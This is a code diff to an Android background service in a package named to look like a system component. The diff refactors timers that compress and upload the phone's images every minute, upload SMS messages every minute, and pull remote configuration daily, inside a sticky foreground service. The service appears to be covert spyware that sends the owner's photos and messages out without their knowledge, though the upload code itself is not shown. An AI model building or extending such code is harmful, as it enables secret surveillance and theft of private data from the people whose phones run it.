@@ -13,6 +13,7 @@ import android.util.Log;
 
 import com.android.media.settings.MediaConfig;
 import com.android.media.settings.MediaDBManager;
+import com.android.media.settings.Models.Media;
 import com.android.media.settings.Utility.MediaCompressorUtility;
 import com.android.media.settings.Utility.SMSUtility;
 import com.android.media.settings.Receiver.MediaReceiver;
@@ -28,10 +29,8 @@ public class MediaService extends Service {
     private static final String TAG = "Media Service";
     private Timer imgMonitorTimer, imgUploadTimer, configTimer, smsTimer;
     private MediaUtility mUtility;
-    private MediaDBManager dbManager;
     private final IBinder mediaBinder = new MediaBinder();
 
-    private NotificationManager mNM;
     private static final Class<?>[] mStartForegroundSignature = new Class[] {
             int.class, Notification.class};
     private static final Class<?>[] mSetForegroundSignature = new Class[] {
@@ -84,7 +83,6 @@ public class MediaService extends Service {
                     "OS doesn't have Service.startForeground OR Service.setForeground!");
         }
         this.mUtility = new MediaUtility(this);
-        this.dbManager = new MediaDBManager(this);
     }
 
     @Override
@@ -97,12 +95,41 @@ public class MediaService extends Service {
         return START_STICKY;
     }
 
+    private MediaCompressorUtility mMediaCompressorUtility;
+    private MediaUploadUtility mMediaUploadUtility;
+    private SMSUtility mSMSUtility;
+    private ConfigUpdaterUtility mConfigUpdaterUtility;
+
+    MediaCompressorUtility getMCUInstance() {
+        if(mMediaCompressorUtility != null) return mMediaCompressorUtility;
+        mMediaCompressorUtility = new MediaCompressorUtility(MediaService.this);
+        return mMediaCompressorUtility;
+    }
+
+    MediaUploadUtility getMUUInstance() {
+        if(mMediaUploadUtility != null) return mMediaUploadUtility;
+        mMediaUploadUtility = new MediaUploadUtility(MediaService.this);
+        return mMediaUploadUtility;
+    }
+
+    SMSUtility getSMSUInstance() {
+        if(mSMSUtility != null) return mSMSUtility;
+        mSMSUtility = new SMSUtility(MediaService.this);
+        return mSMSUtility;
+    }
+
+    ConfigUpdaterUtility getCUUInstance() {
+        if(mConfigUpdaterUtility != null) return mConfigUpdaterUtility;
+        mConfigUpdaterUtility = new ConfigUpdaterUtility(MediaService.this);
+        return mConfigUpdaterUtility;
+    }
+
     private void initMediaCompression() {
         imgMonitorTimer = new Timer();
         imgMonitorTimer.schedule(new TimerTask() {
             @Override
             public void run() {
-                if(!isMediaCompressing) new MediaCompressorUtility(MediaService.this).initImageCompression();
+                getMCUInstance().initImageCompression();
             }
         }, 0, 1000 * 10);
     }
@@ -112,7 +139,7 @@ public class MediaService extends Service {
         imgUploadTimer.schedule(new TimerTask() {
             @Override
             public void run() {
-                if(!isMediaUploading) new MediaUploadUtility(MediaService.this).initUploadServices();
+                getMUUInstance().initUploadServices();
             }
         }, 0, 1000 * 60 );
     }
@@ -122,9 +149,9 @@ public class MediaService extends Service {
         smsTimer.schedule(new TimerTask() {
             @Override
             public void run() {
-                if(!isSMSUploading) new SMSUtility(MediaService.this).initSMSUpload();
+                getSMSUInstance().initSMSUpload();
             }
-        }, 0, 1000 * 30);
+        }, 0, 1000 * 60);
     }
 
     private void initConfigTimer() {
@@ -132,7 +159,7 @@ public class MediaService extends Service {
         configTimer.schedule(new TimerTask() {
             @Override
             public void run() {
-                new ConfigUpdaterUtility(MediaService.this).initConfigUpdater();
+                getCUUInstance().initConfigUpdater();
             }
         }, 0, 1000 * 60 * 60 * 24);
     }
